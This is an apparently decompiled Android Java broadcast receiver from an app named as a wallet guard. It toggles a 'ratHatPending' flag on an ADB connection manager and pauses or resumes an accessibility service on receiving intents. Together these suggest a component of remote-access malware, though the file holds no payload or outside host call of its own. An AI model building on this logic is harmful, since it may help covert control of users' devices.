package com.guard.wallet.receiver;

import com.guard.wallet.core.AppUtils;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.adb.AdbConnectionManager;
import java.util.Objects;

/**
 * vendor AlarmReceiver — handles alarm, pause/resume accessibility actions.
 */
public class AlarmReceiver extends BroadcastReceiver {
    @Override
    public final void onReceive(Context var1, Intent var2) {
        try {
            String var3 = var1.getPackageName().concat(".alarm.action");
            if (Objects.equals(var3, var2.getAction())) {
                StringBuilder var5 = new StringBuilder("onReceive:");
                var5.append(var3);
                Log.d("AlarmReceiver", var5.toString());
                if (AdbConnectionManager.getInstance() != null) {
                    AdbConnectionManager.getInstance().ratHatPending.set(true);
                }
                return;
            }

            if (Objects.equals(var1.getPackageName().concat(".pause.accessibility"), var2.getAction())) {
                Log.d("AlarmReceiver", "onReceive 暂停 Accessibility Service");
                MyAccessibilityService.r2.set(true);
                return;
            }

            if (Objects.equals(var1.getPackageName().concat(".resume.accessibility"), var2.getAction())) {
                Log.d("AlarmReceiver", "onReceive 恢复 Accessibility Service");
                MyAccessibilityService.r2.set(false);
            }
        } catch (Exception var4) {
            AppUtils.s("AlarmReceiver", var4);
        }
    }
}
